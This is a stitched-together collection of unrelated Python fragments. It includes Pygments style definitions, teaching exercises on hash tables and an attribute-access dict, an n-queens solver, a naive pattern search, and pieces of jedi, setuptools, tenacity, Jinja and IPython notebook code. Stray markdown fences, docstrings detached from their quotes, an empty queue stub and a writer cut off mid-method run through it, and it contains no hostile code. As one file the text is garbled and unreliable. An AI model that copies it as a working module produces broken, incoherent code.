class MurphyStyle(Style):
    """
    Murphy's style from CodeRay.
    """

    default_style = ""

    styles = {
        Whitespace:                "#bbbbbb",
        Comment:                   "#666 italic",
        Comment.Preproc:           "#579 noitalic",
        Comment.Special:           "#c00 bold",

        Keyword:                   "bold #289",
        Keyword.Pseudo:            "#08f",
        Keyword.Type:              "#66f",

        Operator:                  "#333",
        Operator.Word:             "bold #000",

        Name.Builtin:              "#072",
        Name.Function:             "bold #5ed",
        Name.Class:                "bold #e9e",
        Name.Namespace:            "bold #0e84b5",
        Name.Exception:            "bold #F00",
        Name.Variable:             "#036",
        Name.Variable.Instance:    "#aaf",
        Name.Variable.Class:       "#ccf",
        Name.Variable.Global:      "#f84",
        Name.Constant:             "bold #5ed",
        Name.Label:                "bold #970",
        Name.Entity:               "#800",
        Name.Attribute:            "#007",
        Name.Tag:                  "#070",
        Name.Decorator:            "bold #555",

        String:                    "bg:#e0e0ff",
        String.Char:               "#88F bg:",
        String.Doc:                "#D42 bg:",
        String.Interpol:           "bg:#eee",
        String.Escape:             "bold #666",
        String.Regex:              "bg:#e0e0ff #000",
        String.Symbol:             "#fc8 bg:",
        String.Other:              "#f88",

        Number:                    "bold #60E",
        Number.Integer:            "bold #66f",
        Number.Float:              "bold #60E",
        Number.Hex:                "bold #058",
        Number.Oct:                "bold #40E",

        Generic.Heading:           "bold #000080",
        Generic.Subheading:        "bold #800080",
        Generic.Deleted:           "#A00000",
        Generic.Inserted:          "#00A000",
        Generic.Error:             "#FF0000",
        Generic.Emph:              "italic",
        Generic.Strong:            "bold",
        Generic.Prompt:            "bold #c65d09",
        Generic.Output:            "#888",
        Generic.Traceback:         "#04D",

        Error:                     "#F00 bg:#FAA"
    }

# Example of accessing elements in list

inside = list("abcdefghijklmnopqrs tuvwyxyz")
print(
    inside[10]
    + inside[0]
    + inside[11]
    + inside[15]
    + inside[0]
    + inside[10]
    + inside[19]
    + inside[20]
    + inside[0]
    + inside[10]
    + inside[4]
)

class MyQueue(object):

    def __init__(self):
        """
        Initialize your data structure here.
        """


    def push(self, x):
        """
        Push element x to the back of queue.
        :type x: int
        :rtype: None
        """


    def pop(self):
        """
        Removes the element from in front of queue and returns that element.
        :rtype: int
        """


    def peek(self):
        """
        Get the front element.
        :rtype: int
        """


    def empty(self):
        """
        Returns whether the queue is empty.
        :rtype: bool
        """



# Your MyQueue object will be instantiated and called as such:
# obj = MyQueue()
# obj.push(x)
# param_2 = obj.pop()
# param_3 = obj.peek()
# param_4 = obj.empty()
class Dict(dict):
    def __init__(self, **kw):
        super().__init__(**kw)

    def __getattr__(self, key):
        try:
            return self[key]
        except KeyError:
            raise AttributeError(r"'Dict' object has no attribute '%s'" % key)

    def __setattr__(self, key, value):
        self[key] = value

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


class Dict(dict):
    """
    Simple dict but also support access as x.y style.

    >>> d1 = Dict()
    >>> d1['x'] = 100
    >>> d1.x
    100
    >>> d1.y = 200
    >>> d1['y']
    200
    >>> d2 = Dict(a=1, b=2, c='3')
    >>> d2.c
    '3'
    >>> d2['empty']
    Traceback (most recent call last):
        ...
    KeyError: 'empty'
    >>> d2.empty
    Traceback (most recent call last):
        ...
    AttributeError: 'Dict' object has no attribute 'empty'
    """

    def __init__(self, **kw):
        super(Dict, self).__init__(**kw)

    def __getattr__(self, key):
        try:
            return self[key]
        except KeyError:
            raise AttributeError(r"'Dict' object has no attribute '%s'" % key)

    def __setattr__(self, key, value):
        self[key] = value


if __name__ == "__main__":
    import doctest

    doctest.testmod()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import unittest

from mydict import Dict


class TestDict(unittest.TestCase):
    def test_init(self):
        d = Dict(a=1, b="test")
        self.assertEqual(d.a, 1)
        self.assertEqual(d.b, "test")
        self.assertTrue(isinstance(d, dict))

    def test_key(self):
        d = Dict()
        d["key"] = "value"
        self.assertEqual(d.key, "value")

    def test_attr(self):
        d = Dict()
        d.key = "value"
        self.assertTrue("key" in d)
        self.assertEqual(d["key"], "value")

    def test_keyerror(self):
        d = Dict()
        with self.assertRaises(KeyError):
            value = d["empty"]

    def test_attrerror(self):
        d = Dict()
        with self.assertRaises(AttributeError):
            value = d.empty


if __name__ == "__main__":
    unittest.main()

hash_table = [None] * 8   # 8 slots, all initiailized to None

def my_hash(s):
    sb = s.encode()  # Get the UTF-8 bytes for the string

    sum = 0

    for b in sb:
        sum += b
        sum &= 0xffffffff  # clamp to 32 bits

    return sum

# hash the index
def hash_index(key):
    h = my_hash(key)
    return h % len(hash_table)

# put
def put(key, val):
    i = hash_index(key)
    if hash_table[i] != None:
        print(f"Collision! Overwriting {repr(hash_table[i])}")
    hash_table[i] = val

# get
def get(key):
    i = hash_index(key)
    return hash_table[i]

# delete
def delete(key):
    i = hash_index(key)
    hash_table[i] = None


if __name__ == "__main__":

    put("Hello", "Hello Value")
    put("World", "World Value")
    put("foo", "foo value")   # "foo" hashes to same index as "Hello"
                            # AKA "foo collides with Hello"

    print(hash_table)

    v = get("Hello")
    print(v) # "Hello Value"

    # Get "Frogs" from the table
    # Doesn't exist!
    v = get("Frogs")
    print(v)  # "None"

class HashTableEntry:
    def __init__(self, key, value):
        self.key = key
        self.value = value

    def __repr__(self):
        return f'HashTableEntry({repr(self.key)},{repr(self.value)})'

# lets refactor some code

hash_table = [None] * 8   # 8 slots, all initiailized to None

def my_hash(s):
    sb = s.encode()  # Get the UTF-8 bytes for the string

    sum = 0

    for b in sb:
        sum += b
        sum &= 0xffffffff  # clamp to 32 bits

    return sum

# hash the index
def hash_index(key):
    h = my_hash(key)
    return h % len(hash_table)

# put
def put(key, val):
    i = hash_index(key)

        # while the hash_table[i] != None
            # then increment index and try again
    if hash_table[i] != None:
        print(f"Collision! Overwriting {repr(hash_table[i])}")
    hash_table[i] = HashTableEntry(key, val)

# get
def get(key):
    i = hash_index(key)

    entry = hash_table[i]
    if entry == None:
        return None
    # while the entry.key != key
        # then increment index and try again

    return entry.value

# delete
def delete(key):
    i = hash_index(key)
    hash_table[i] = None








if __name__ == "__main__":

    # put("Hello", "Hello Value")
    # put("World", "World Value")

    # print(f"{hash_table}\n")

    # put("foo", "foo value")   # "foo" hashes to same index as "Hello"
    #                         # AKA "foo collides with Hello"
    # print(f"\n{hash_table}\n");

    # v = get("Hello")
    # print(f'Hello value is: {v}') # Should be "Hello Value", but gives "foo value"
    pass
# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyEmpty module for example.```


```py

#end_pymotw_header
import os
print('Loaded {} from {}'.format(
    __name__, __file__[len(os.getcwd()) + 1:])
)
````

```py

 The nqueens problem is of placing N queens on a N * N
 chess board such that no queen can attack any other queens placed
 on that chess board.
 This means that one queen cannot have any other queen on its horizontal, vertical and
 diagonal lines.
```

```py
from typing import List

solution = []


def isSafe(board: List[List[int]], row: int, column: int) -> bool:
    """
    This function returns a boolean value True if it is safe to place a queen there
    considering the current state of the board.

    Parameters :
    board(2D matrix) : board
    row ,column : coordinates of the cell on a board

    Returns :
    Boolean Value

    """
    for i in range(len(board)):
        if board[row][i] == 1:
            return False
    for i in range(len(board)):
        if board[i][column] == 1:
            return False
    for i, j in zip(range(row, -1, -1), range(column, -1, -1)):
        if board[i][j] == 1:
            return False
    for i, j in zip(range(row, -1, -1), range(column, len(board))):
        if board[i][j] == 1:
            return False
    return True


def solve(board: List[List[int]], row: int) -> bool:
    """
    It creates a state space tree and calls the safe function until it receives a
    False Boolean and terminates that branch and backtracks to the next
    possible solution branch.
    """
    if row >= len(board):
        """
        If the row number exceeds N we have board with a successful combination
        and that combination is appended to the solution list and the board is printed.

        """
        solution.append(board)
        printboard(board)
        print()
        return True
    for i in range(len(board)):
        """
        For every row it iterates through each column to check if it is feasible to
        place a queen there.
        If all the combinations for that particular branch are successful the board is
        reinitialized for the next possible combination.
        """
        if isSafe(board, row, i):
            board[row][i] = 1
            solve(board, row + 1)
            board[row][i] = 0
    return False


def printboard(board: List[List[int]]) -> None:
    """
    Prints the boards that have a successful combination.
    """
    for i in range(len(board)):
        for j in range(len(board)):
            if board[i][j] == 1:
                print("Q", end=" ")
            else:
                print(".", end=" ")
        print()


# n=int(input("The no. of queens"))
n = 8
board = [[0 for i in range(n)] for j in range(n)]
solve(board, 0)
print("The total no. of solutions are :", len(solution))

# Input : arr[] : {1, 2, 3, 4, 5}
#         ranges[] = { {0, 2}, {0, 3} }
#         index : 1
# Output : 3
# Explanation : After first given rotation {0, 2}
#                 arr[] = {3, 1, 2, 4, 5}
#               After second rotation {0, 3}
#                 arr[] = {4, 3, 1, 2, 5}
# After all rotations we have element 3 at given
# index 1.

from __future__ import absolute_import, unicode_literals

from contextlib import contextmanager

from .base import AppData, ContentStore


class AppDataDisabled(AppData):
    """No application cache available (most likely as we don't have write permissions)"""

    transient = True
    can_update = False

    def __init__(self):
        pass

    error = RuntimeError("no app data folder available, probably no write access to the folder")

    def close(self):
        """do nothing"""

    def reset(self):
        """do nothing"""

    def py_info(self, path):
        return ContentStoreNA()

    def embed_update_log(self, distribution, for_py_version):
        return ContentStoreNA()

    def extract(self, path, to_folder):
        raise self.error

    @contextmanager
    def locked(self, path):
        """do nothing"""
        yield

    @property
    def house(self):
        raise self.error

    def wheel_image(self, for_py_version, name):
        raise self.error

    def py_info_clear(self):
        """ """


class ContentStoreNA(ContentStore):
    def exists(self):
        return False

    def read(self):
        """ """
        return None

    def write(self, content):
        """ """

    def remove(self):
        """ """

    @contextmanager
    def locked(self):
        yield

import sys
import re
from numpy.distutils.fcompiler import FCompiler

compilers = ['NAGFCompiler', 'NAGFORCompiler']

class BaseNAGFCompiler(FCompiler):
    version_pattern = r'NAG.* Release (?P<version>[^(\s]*)'

    def version_match(self, version_string):
        m = re.search(self.version_pattern, version_string)
        if m:
            return m.group('version')
        else:
            return None

    def get_flags_linker_so(self):
        return ["-Wl,-shared"]
    def get_flags_opt(self):
        return ['-O4']
    def get_flags_arch(self):
        return []

class NAGFCompiler(BaseNAGFCompiler):

    compiler_type = 'nag'
    description = 'NAGWare Fortran 95 Compiler'

    executables = {
        'version_cmd'  : ["<F90>", "-V"],
        'compiler_f77' : ["f95", "-fixed"],
        'compiler_fix' : ["f95", "-fixed"],
        'compiler_f90' : ["f95"],
        'linker_so'    : ["<F90>"],
        'archiver'     : ["ar", "-cr"],
        'ranlib'       : ["ranlib"]
        }

    def get_flags_linker_so(self):
        if sys.platform == 'darwin':
            return ['-unsharedf95', '-Wl,-bundle,-flat_namespace,-undefined,suppress']
        return BaseNAGFCompiler.get_flags_linker_so(self)
    def get_flags_arch(self):
        version = self.get_version()
        if version and version < '5.1':
            return ['-target=native']
        else:
            return BaseNAGFCompiler.get_flags_arch(self)
    def get_flags_debug(self):
        return ['-g', '-gline', '-g90', '-nan', '-C']

class NAGFORCompiler(BaseNAGFCompiler):

    compiler_type = 'nagfor'
    description = 'NAG Fortran Compiler'

    executables = {
        'version_cmd'  : ["nagfor", "-V"],
        'compiler_f77' : ["nagfor", "-fixed"],
        'compiler_fix' : ["nagfor", "-fixed"],
        'compiler_f90' : ["nagfor"],
        'linker_so'    : ["nagfor"],
        'archiver'     : ["ar", "-cr"],
        'ranlib'       : ["ranlib"]
        }

    def get_flags_debug(self):
        version = self.get_version()
        if version and version > '6.1':
            return ['-g', '-u', '-nan', '-C=all', '-thread_safe',
                    '-kind=unique', '-Warn=allocation', '-Warn=subnormal']
        else:
            return ['-g', '-nan', '-C=all', '-u', '-thread_safe']


if __name__ == '__main__':
    from distutils import log
    log.set_verbosity(2)
    from numpy.distutils import customized_fcompiler
    compiler = customized_fcompiler(compiler='nagfor')
    print(compiler.get_version())
    print(compiler.get_flags_debug())

# lets make a simple hash function that takes in an abitary string and output the bytes of that string


# first lets see what output we get when iterating over the string

def my_hash(s):
    for c in s:
        print(c)

# so how can we turn each char in to a number?
# let's make a plan and explore this

def my_hash2(s):
    nums = s.encode()
    for b in nums:
        print(b)


# now one ster further lets thing of a deterministic way to make a number to represent the entire string

def my_hash3(s):
    nums = s.encode()
    sum = 0

    for b in nums:
        sum += b
        sum &= 0xffffffff # clamp to 32 bits

    return sum


# my_hash("Hello")
# my_hash2("Hello")
# print(my_hash2("Hello"))
print(my_hash3("Hello")) # 500
print(my_hash3("Hello")) # 500
print(my_hash3("Hello")) # 500
print(my_hash3("World")) # 520
print(my_hash3("World")) # 520
print(my_hash3("World")) # 520
```

````py
https://en.wikipedia.org/wiki/String-searching_algorithm#Na%C3%AFve_string_search

this algorithm tries to find the pattern from every position of
the mainString if pattern is found from position i it add it to
the answer and does the same for position i+1

Complexity : O(n*m)
    n=length of main string
    m=length of pattern string```


```py


def naive_pattern_search(s: str, pattern: str) -> list:
    """
    >>> naive_pattern_search("ABAAABCDBBABCDDEBCABC", "ABC")
    [4, 10, 18]
    >>> naive_pattern_search("ABC", "ABAAABCDBBABCDDEBCABC")
    []
    >>> naive_pattern_search("", "ABC")
    []
    >>> naive_pattern_search("TEST", "TEST")
    [0]
    >>> naive_pattern_search("ABCDEGFTEST", "TEST")
    [7]
    """
    pat_len = len(pattern)
    position = []
    for i in range(len(s) - pat_len + 1):
        match_found = True
        for j in range(pat_len):
            if s[i + j] != pattern[j]:
                match_found = False
                break
        if match_found:
            position.append(i)
    return position


if __name__ == "__main__":
    assert naive_pattern_search("ABCDEFG", "DE") == [3]
    print(f"{naive_pattern_search('ABAAABCDBBABCDDEBCABC', 'ABC') = }")

from math import sqrt
from collections import namedtuple

# using normal tuple to represent color (red, green, blue)
color = (20, 40, 60)
# print the red color
print(color[0])

# use a named tuple for better readability because of the object notation it has
Color = namedtuple("Color", ["red", "green", "blue"])
color = Color(20, 40, 60)
# you can use object notation or indexing to extract data
print(color.red)
print(color[0])

# However, as with tuples, attributes in named tuples are immutable. it has the _replace method to change values
color = color._replace(red=200)

# Named Tuple can be transformed to dict
print(color._asdict())

import time

start_time = time.time()

f = open("names_1.txt", "r")
names_1 = f.read().split("\n")  # List containing 10000 names
f.close()

f = open("names_2.txt", "r")
names_2 = f.read().split("\n")  # List containing 10000 names
f.close()

# duplicates = []
# for name_1 in names_1:
#     for name_2 in names_2:
#         if name_1 == name_2:
#             duplicates.append(name_1)

duplicates = []
names = dict()

for n1 in names_1:
    names[n1] = n1
    # {'Jean Velazquez': 'Jean Velazquez'}

for n2 in names_2:
    if n2 in names:  # duplicate check
        duplicates.append(n2)  # add

end_time = time.time()

# count
print(
    f"{len(duplicates)} duplicates:\n\n{', '.join(duplicates)}\n\n"
)  # total duplicates
print(f"runtime: {end_time - start_time} seconds")

# runtime: 9.610661268234253 seconds
# runtime: 0.009972810745239258 seconds

from jedi.inference.cache import inference_state_method_cache
from jedi.inference.filters import DictFilter
from jedi.inference.names import ValueNameMixin, AbstractNameDefinition
from jedi.inference.base_value import Value
from jedi.inference.value.module import SubModuleDictMixin
from jedi.inference.context import NamespaceContext


class ImplicitNSName(ValueNameMixin, AbstractNameDefinition):
    """
    Accessing names for implicit namespace packages should infer to nothing.
    This object will prevent Jedi from raising exceptions
    """
    def __init__(self, implicit_ns_value, string_name):
        self._value = implicit_ns_value
        self.string_name = string_name


class ImplicitNamespaceValue(Value, SubModuleDictMixin):
    """
    Provides support for implicit namespace packages
    """
    # Is a module like every other module, because if you import an empty
    # folder foobar it will be available as an object:
    # <module 'foobar' (namespace)>.
    api_type = 'module'
    parent_context = None

    def __init__(self, inference_state, string_names, paths):
        super().__init__(inference_state, parent_context=None)
        self.inference_state = inference_state
        self.string_names = string_names
        self._paths = paths

    def get_filters(self, origin_scope=None):
        yield DictFilter(self.sub_modules_dict())

    def get_qualified_names(self):
        return ()

    @property  # type: ignore[misc]
    @inference_state_method_cache()
    def name(self):
        string_name = self.py__package__()[-1]
        return ImplicitNSName(self, string_name)

    def py__file__(self):
        return None

    def py__package__(self):
        """Return the fullname
        """
        return self.string_names

    def py__path__(self):
        return self._paths

    def py__name__(self):
        return '.'.join(self.string_names)

    def is_namespace(self):
        return True

    def is_stub(self):
        return False

    def is_package(self):
        return True

    def as_context(self):
        return NamespaceContext(self)

    def __repr__(self):
        return '<%s: %s>' % (self.__class__.__name__, self.py__name__())

import os
from distutils import log
import itertools


flatten = itertools.chain.from_iterable


class Installer:

    nspkg_ext = "-nspkg.pth"

    def install_namespaces(self):
        nsp = self._get_all_ns_packages()
        if not nsp:
            return
        filename, ext = os.path.splitext(self._get_target())
        filename += self.nspkg_ext
        self.outputs.append(filename)
        log.info("Installing %s", filename)
        lines = map(self._gen_nspkg_line, nsp)

        if self.dry_run:
            # always generate the lines, even in dry run
            list(lines)
            return

        with open(filename, "wt") as f:
            f.writelines(lines)

    def uninstall_namespaces(self):
        filename, ext = os.path.splitext(self._get_target())
        filename += self.nspkg_ext
        if not os.path.exists(filename):
            return
        log.info("Removing %s", filename)
        os.remove(filename)

    def _get_target(self):
        return self.target

    _nspkg_tmpl = (
        "import sys, types, os",
        "has_mfs = sys.version_info > (3, 5)",
        "p = os.path.join(%(root)s, *%(pth)r)",
        "importlib = has_mfs and __import__('importlib.util')",
        "has_mfs and __import__('importlib.machinery')",
        (
            "m = has_mfs and "
            "sys.modules.setdefault(%(pkg)r, "
            "importlib.util.module_from_spec("
            "importlib.machinery.PathFinder.find_spec(%(pkg)r, "
            "[os.path.dirname(p)])))"
        ),
        ("m = m or " "sys.modules.setdefault(%(pkg)r, types.ModuleType(%(pkg)r))"),
        "mp = (m or []) and m.__dict__.setdefault('__path__',[])",
        "(p not in mp) and mp.append(p)",
    )
    "lines for the namespace installer"

    _nspkg_tmpl_multi = ("m and setattr(sys.modules[%(parent)r], %(child)r, m)",)
    "additional line(s) when a parent package is indicated"

    def _get_root(self):
        return "sys._getframe(1).f_locals['sitedir']"

    def _gen_nspkg_line(self, pkg):
        pth = tuple(pkg.split("."))
        root = self._get_root()
        tmpl_lines = self._nspkg_tmpl
        parent, sep, child = pkg.rpartition(".")
        if parent:
            tmpl_lines += self._nspkg_tmpl_multi
        return ";".join(tmpl_lines) % locals() + "\n"

    def _get_all_ns_packages(self):
        """Return sorted list of all package namespaces"""
        pkgs = self.distribution.namespace_packages or []
        return sorted(flatten(map(self._pkg_names, pkgs)))

    @staticmethod
    def _pkg_names(pkg):
        """
        Given a namespace package, yield the components of that
        package.

        >>> names = Installer._pkg_names('a.b.c')
        >>> set(names) == set(['a', 'a.b', 'a.b.c'])
        True
        """
        parts = pkg.split(".")
        while parts:
            yield ".".join(parts)
            parts.pop()


class DevelopInstaller(Installer):
    def _get_root(self):
        return repr(str(self.egg_path))

    def _get_target(self):
        return self.egg_link

# Copyright 2016 Étienne Bersac
# Copyright 2016 Julien Danjou
# Copyright 2016 Joshua Harlow
# Copyright 2013-2014 Ray Holder
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import time
import typing

if typing.TYPE_CHECKING:
    import threading


def sleep(seconds: float) -> None:
    """
    Sleep strategy that delays execution for a given number of seconds.

    This is the default strategy, and may be mocked out for unit testing.
    """
    time.sleep(seconds)


class sleep_using_event:
    """Sleep strategy that waits on an event to be set."""

    def __init__(self, event: "threading.Event") -> None:
        self.event = event

    def __call__(self, timeout: typing.Optional[float]) -> None:
        # NOTE(harlowja): this may *not* actually wait for timeout
        # seconds if the event is set (ie this may eject out early).
        self.event.wait(timeout=timeout)
````

````py
    pygments.styles.native
    ~~~~~~~~~~~~~~~~~~~~~~

    pygments version of my "native" vim theme.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Token, Whitespace


class NativeStyle(Style):
    """
    Pygments version of the "native" vim theme.
    """

    background_color = '#202020'
    highlight_color = '#404040'
    line_number_color = '#aaaaaa'

    styles = {
        Token:              '#d0d0d0',
        Whitespace:         '#666666',

        Comment:            'italic #999999',
        Comment.Preproc:    'noitalic bold #cd2828',
        Comment.Special:    'noitalic bold #e50808 bg:#520000',

        Keyword:            'bold #6ab825',
        Keyword.Pseudo:     'nobold',
        Operator.Word:      'bold #6ab825',

        String:             '#ed9d13',
        String.Other:       '#ffa500',

        Number:             '#3677a9',

        Name.Builtin:       '#24909d',
        Name.Variable:      '#40ffff',
        Name.Constant:      '#40ffff',
        Name.Class:         'underline #447fcf',
        Name.Function:      '#447fcf',
        Name.Namespace:     'underline #447fcf',
        Name.Exception:     '#bbbbbb',
        Name.Tag:           'bold #6ab825',
        Name.Attribute:     '#bbbbbb',
        Name.Decorator:     '#ffa500',

        Generic.Heading:    'bold #ffffff',
        Generic.Subheading: 'underline #ffffff',
        Generic.Deleted:    '#d22323',
        Generic.Inserted:   '#589819',
        Generic.Error:      '#d22323',
        Generic.Emph:       'italic',
        Generic.Strong:     'bold',
        Generic.Prompt:     '#aaaaaa',
        Generic.Output:     '#cccccc',
        Generic.Traceback:  '#d22323',

        Error:              'bg:#e3d2d2 #a61717'
    }

from ast import literal_eval
from itertools import chain
from itertools import islice

from . import nodes
from ._compat import text_type
from .compiler import CodeGenerator
from .compiler import has_safe_repr
from .environment import Environment
from .environment import Template


def native_concat(nodes):
    """Return a native Python type from the list of compiled nodes. If
    the result is a single node, its value is returned. Otherwise, the
    nodes are concatenated as strings. If the result can be parsed with
    :func:`ast.literal_eval`, the parsed value is returned. Otherwise,
    the string is returned.

    :param nodes: Iterable of nodes to concatenate.
    """
    head = list(islice(nodes, 2))

    if not head:
        return None

    if len(head) == 1:
        raw = head[0]
    else:
        raw = u"".join([text_type(v) for v in chain(head, nodes)])

    try:
        return literal_eval(raw)
    except (ValueError, SyntaxError, MemoryError):
        return raw


class NativeCodeGenerator(CodeGenerator):
    """A code generator which renders Python types by not adding
    ``to_string()`` around output nodes.
    """

    @staticmethod
    def _default_finalize(value):
        return value

    def _output_const_repr(self, group):
        return repr(u"".join([text_type(v) for v in group]))

    def _output_child_to_const(self, node, frame, finalize):
        const = node.as_const(frame.eval_ctx)

        if not has_safe_repr(const):
            raise nodes.Impossible()

        if isinstance(node, nodes.TemplateData):
            return const

        return finalize.const(const)

    def _output_child_pre(self, node, frame, finalize):
        if finalize.src is not None:
            self.write(finalize.src)

    def _output_child_post(self, node, frame, finalize):
        if finalize.src is not None:
            self.write(")")


class NativeEnvironment(Environment):
    """An environment that renders templates to native Python types."""

    code_generator_class = NativeCodeGenerator


class NativeTemplate(Template):
    environment_class = NativeEnvironment

    def render(self, *args, **kwargs):
        """Render the template to produce a native Python type. If the
        result is a single node, its value is returned. Otherwise, the
        nodes are concatenated as strings. If the result can be parsed
        with :func:`ast.literal_eval`, the parsed value is returned.
        Otherwise, the string is returned.
        """
        vars = dict(*args, **kwargs)

        try:
            return native_concat(self.root_render_func(self.new_context(vars)))
        except Exception:
            return self.environment.handle_exception()


NativeEnvironment.template_class = NativeTemplate

from __future__ import annotations

import re


def natural_sort(input_list: list[str]) -> list[str]:
    """
    Sort the given list of strings in the way that humans expect.

    The normal Python sort algorithm sorts lexicographically,
    so you might not get the results that you expect...

    >>> example1 = ['2 ft 7 in', '1 ft 5 in', '10 ft 2 in', '2 ft 11 in', '7 ft 6 in']
    >>> sorted(example1)
    ['1 ft 5 in', '10 ft 2 in', '2 ft 11 in', '2 ft 7 in', '7 ft 6 in']
    >>> # The natural sort algorithm sort based on meaning and not computer code point.
    >>> natural_sort(example1)
    ['1 ft 5 in', '2 ft 7 in', '2 ft 11 in', '7 ft 6 in', '10 ft 2 in']

    >>> example2 = ['Elm11', 'Elm12', 'Elm2', 'elm0', 'elm1', 'elm10', 'elm13', 'elm9']
    >>> sorted(example2)
    ['Elm11', 'Elm12', 'Elm2', 'elm0', 'elm1', 'elm10', 'elm13', 'elm9']
    >>> natural_sort(example2)
    ['elm0', 'elm1', 'Elm2', 'elm9', 'elm10', 'Elm11', 'Elm12', 'elm13']
    """

    def alphanum_key(key):
        return [int(s) if s.isdigit() else s.lower() for s in re.split("([0-9]+)", key)]

    return sorted(input_list, key=alphanum_key)


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````pyThe basic dict based notebook format.

Authors:

* Brian Granger```


```py

#-----------------------------------------------------------------------------
#  Copyright (C) 2008-2011  The IPython Development Team
#
#  Distributed under the terms of the BSD License.  The full license is in
#  the file COPYING, distributed as part of this software.
#-----------------------------------------------------------------------------

#-----------------------------------------------------------------------------
# Imports
#-----------------------------------------------------------------------------

import pprint
import uuid

from ipython_genutils.ipstruct import Struct

#-----------------------------------------------------------------------------
# Code
#-----------------------------------------------------------------------------

class NotebookNode(Struct):
    pass


def from_dict(d):
    if isinstance(d, dict):
        newd = NotebookNode()
        for k,v in d.items():
            newd[k] = from_dict(v)
        return newd
    elif isinstance(d, (tuple, list)):
        return [from_dict(i) for i in d]
    else:
        return d


def new_code_cell(code=None, prompt_number=None):
    """Create a new code cell with input and output"""
    cell = NotebookNode()
    cell.cell_type = u'code'
    if code is not None:
        cell.code = str(code)
    if prompt_number is not None:
        cell.prompt_number = int(prompt_number)
    return cell


def new_text_cell(text=None):
    """Create a new text cell."""
    cell = NotebookNode()
    if text is not None:
        cell.text = str(text)
    cell.cell_type = u'text'
    return cell


def new_notebook(cells=None):
    """Create a notebook by name, id and a list of worksheets."""
    nb = NotebookNode()
    if cells is not None:
        nb.cells = cells
    else:
        nb.cells = []
    return nb


from ..nbbase import (
    NotebookNode,
    new_code_cell, new_text_cell, new_notebook
)



nb0 = new_notebook()

nb0.cells.append(new_text_cell(
    text='Some NumPy Examples'
))


nb0.cells.append(new_code_cell(
    code='import numpy',
    prompt_number=1
))

nb0.cells.append(new_code_cell(
    code='a = numpy.random.rand(100)',
    prompt_number=2
))

nb0.cells.append(new_code_cell(
    code='print a',
    prompt_number=3
))


# -*- coding: utf-8 -*-```


```pyShim providing notebook.nbextensions stuff from 4.2 for earlier versions."""

try:
    # notebook >= 5.0
    from notebook.extensions import BaseExtensionApp
    BaseNBExtensionApp = BaseExtensionApp
except ImportError as err:
    try:
        from notebook.nbextensions import BaseNBExtensionApp
    except ImportError as err:
        from ._compat.nbextensions import BaseNBExtensionApp
    BaseExtensionApp = BaseNBExtensionApp

try:
    from notebook.nbextensions import _nbextension_dirs
except ImportError as err:
    from ._compat.nbextensions import _nbextension_dirs

try:
    from notebook.nbextensions import (
        # constants
        GREEN_ENABLED, GREEN_OK, NBCONFIG_SECTIONS, RED_DISABLED, RED_X,
        # Apps & classes
        ArgumentConflict,
        # public API functions
        _set_nbextension_state, _set_nbextension_state_python,
        disable_nbextension, disable_nbextension_python,
        enable_nbextension, enable_nbextension_python,
        install_nbextension, install_nbextension_python,
        uninstall_nbextension, uninstall_nbextension_python,
        validate_nbextension, validate_nbextension_python,
        # private API functions
        _get_nbextension_dir, _get_config_dir,
        _get_nbextension_metadata,
    )
except ImportError as err:
    from ._compat.nbextensions import (
        # constants
        GREEN_ENABLED, GREEN_OK, NBCONFIG_SECTIONS, RED_DISABLED, RED_X,
        # Apps & classes
        ArgumentConflict,
        # public API functions
        _set_nbextension_state, _set_nbextension_state_python,
        disable_nbextension, disable_nbextension_python,
        enable_nbextension, enable_nbextension_python,
        install_nbextension, install_nbextension_python,
        uninstall_nbextension, uninstall_nbextension_python,
        validate_nbextension, validate_nbextension_python,
        # private API functions
        _get_nbextension_dir, _get_config_dir,
        _get_nbextension_metadata,
    )

__all__ = [
    # constants
    'GREEN_ENABLED', 'GREEN_OK', 'NBCONFIG_SECTIONS', 'RED_DISABLED', 'RED_X',
    # Apps & classes
    'ArgumentConflict', 'BaseNBExtensionApp',
    # public API functions
    '_set_nbextension_state', '_set_nbextension_state_python',
    'disable_nbextension', 'disable_nbextension_python',
    'enable_nbextension', 'enable_nbextension_python',
    'install_nbextension', 'install_nbextension_python',
    'uninstall_nbextension', 'uninstall_nbextension_python',
    'validate_nbextension', 'validate_nbextension_python',
    # private API functions
    '_get_nbextension_dir', '_nbextension_dirs', '_get_config_dir',
    '_get_nbextension_metadata',
]

from typing import TypeVar, Union
import numpy as np
import numpy.typing as npt

T1 = TypeVar("T1", bound=npt.NBitBase)
T2 = TypeVar("T2", bound=npt.NBitBase)

def add(a: np.floating[T1], b: np.integer[T2]) -> np.floating[Union[T1, T2]]:
    return a + b

i8: np.int64
i4: np.int32
f8: np.float64
f4: np.float32

reveal_type(add(f8, i8))  # E: {float64}
reveal_type(add(f4, i8))  # E: {float64}
reveal_type(add(f8, i4))  # E: {float64}
reveal_type(add(f4, i4))  # E: {float32}
````

```pyRead and write notebooks in JSON format."""

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

import copy
import json

from .nbbase import from_dict
from .rwbase import (
    NotebookReader, NotebookWriter, restore_bytes, rejoin_lines, split_lines,
    strip_transient,
)


class BytesEncoder(json.JSONEncoder):
    """A JSON encoder that accepts b64 (and other *ascii*) bytestrings."""
    def default(self, obj):
        if isinstance(obj, bytes):
            return obj.decode('ascii')
        return json.JSONEncoder.default(self, obj)


class JSONReader(NotebookReader):

    def reads(self, s, **kwargs):
        nb = json.loads(s, **kwargs)
        nb = self.to_notebook(nb, **kwargs)
        nb = strip_transient(nb)
        return nb

    def to_notebook(self, d, **kwargs):
        return rejoin_lines(from_dict(d))


class JSONWriter(NotebookWriter):

    def writes(self, nb, **kwargs):
        kwargs['cls'] = BytesEncoder
        kwargs['indent'] = 1
        kwargs['sort_keys'] = True
        kwargs['separators'] = (',',': ')
